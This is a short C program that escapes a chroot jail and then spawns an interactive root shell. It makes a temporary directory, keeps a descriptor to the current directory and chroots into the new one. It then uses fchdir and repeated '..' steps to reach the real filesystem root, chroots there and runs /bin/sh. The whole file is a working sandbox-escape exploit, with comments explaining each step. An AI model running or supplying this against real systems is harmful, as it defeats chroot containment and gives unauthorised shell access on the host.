#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/stat.h>
#include <sys/types.h>


int main()
{

	int fd;
	char *cmd[3];


	/* We need a temporary directory to chroot into. */
	if (mkdir("tmp", 0777)) {
		perror("mkdir");
		return 1;
	}

	/* Let's open our cwd first... */
	if ((fd = open(".", O_RDONLY)) < 0) {
		perror("open");
		return 2;
	}

	/* Then chroot below our current root. */
	if (chroot("tmp")) {
		perror("chroot");
		return 3;
	}

	/* Use fchdir to move out of our lowered root... */
	if (fchdir(fd)) {
		perror("fchdir");
		return 4;
	}

	/* We are now out, so we can cd anywhere... */
	if (chdir("../../../../../../../../../../../")) {
		perror("chdir");
		return 5;
	}

	/* We should be at the system root now, let's chroot here. */
	if (chroot(".")) {
		perror("chroot");
		return 6;
	}

	cmd[0] = "/bin/sh";
	cmd[1] = "-i";
	cmd[2] = NULL;

	/* Now that we are out, let's exec a shell to finish. */
	execve(cmd[0], cmd, NULL);

	perror("execlp");
	return 7;

}

